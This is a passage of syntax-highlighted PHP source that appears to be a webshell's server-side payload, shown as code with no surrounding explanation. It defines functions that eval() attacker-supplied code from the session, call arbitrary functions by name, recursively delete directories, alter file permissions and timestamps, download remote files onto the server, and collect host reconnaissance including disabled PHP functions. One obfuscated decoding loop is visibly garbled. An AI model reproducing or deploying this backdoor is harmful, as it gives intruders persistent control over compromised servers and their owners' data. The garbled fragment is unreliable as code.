punctuation\">(</span><span class=\"token variable\">$_SES</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sessioId</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> @<span class=\"token function\">session_write_close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">canCallGzipEncode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">gzencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">payloadExceptionHandler</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$exception</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">global</span> <span class=\"token variable\">$ERRMSG</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$ERRMSG</span><span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\"ExceptionMsg:\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$exception</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">payloadErrorHandler</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errno</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errstr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errfile</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$errline</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$errcontext</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">global</span> <span class=\"token variable\">$ERRMSG</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$ERRMSG</span><span class=\"token operator\">.=</span><span class=\"token string double-quoted-string\">\"ErrLine: <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$errline</span><span class=\"token punctuation\">}</span></span> ErrorMsg:<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$errstr</span><span class=\"token punctuation\">}</span></span>\\r\\n\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">S1MiwYYr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$K</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$istrlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pms</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">evalFunc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">session_write_close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$className</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"codeName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$methodName</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"methodName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$_SES</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$methodName</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$className</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$methodName</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"includeCode\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token function\">includeCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$className</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$className</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$className</span><span class=\"token punctuation\">}</span></span> no load\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$methodName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$methodName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"function <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$methodName</span><span class=\"token punctuation\">}</span></span> not exist\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"methodName Is Null\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">deleteDir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$m</span><span class=\"token operator\">=</span>@<span class=\"token function\">dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$f</span><span class=\"token operator\">=</span><span class=\"token variable\">$m</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$pf</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span> @<span class=\"token function\">chmod</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pf</span><span class=\"token punctuation\">,</span><span class=\"token number\">0777</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">!=</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">!=</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token function\">deleteDir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> @<span class=\"token function\">rmdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pf</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">!=</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token operator\">!=</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pf</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token variable\">$m</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> @<span class=\"token function\">chmod</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">,</span><span class=\"token number\">0777</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> @<span class=\"token function\">rmdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">deleteFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$F</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fileName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$F</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token function\">deleteDir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$F</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$F</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span>@<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$F</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setFileAttr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$type</span> <span class=\"token operator\">=</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$attr</span> <span class=\"token operator\">=</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"attr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$fileName</span> <span class=\"token operator\">=</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fileName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$ret</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Null\"</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$attr</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$fileName</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"fileBasicAttr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">chmod</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">,</span><span class=\"token function\">convertFilePermissions</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$attr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"fileTimeAttr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">touch</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileName</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$attr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"no ExcuteType\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$ret</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"type or attr or fileName is null\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$ret</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">fileRemoteDown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"url\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$saveFile</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"saveFile\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$saveFile</span><span class=\"token operator\">!=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token variable\">$data</span><span class=\"token operator\">=</span>@<span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$saveFile</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">chmod</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$saveFile</span><span class=\"token punctuation\">,</span><span class=\"token number\">0777</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"write fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"read fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"url or saveFile is null\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">copyFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$srcFileName</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"srcFileName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$destFileName</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"destFileName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>@<span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$srcFileName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">copy</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$srcFileName</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$destFileName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"The target does not exist or is not a file\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">moveFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$srcFileName</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"srcFileName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$destFileName</span><span class=\"token operator\">=</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"destFileName\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">rename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$srcFileName</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$destFileName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"ok\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"fail\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getBasicsInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'OsInfo'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">php_uname</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CurrentUser'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">get_current_user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CurrentUser'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CurrentUser'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'CurrentUser'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">'NULL'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_PORT'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_PORT'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_CLIENT_IP'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_CLIENT_IP'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_ADDR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_NAME'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_PORT'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SERVER_PORT'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'disable_functions'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> @<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'disable_functions'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'disable_functions'</span><span class=\"token 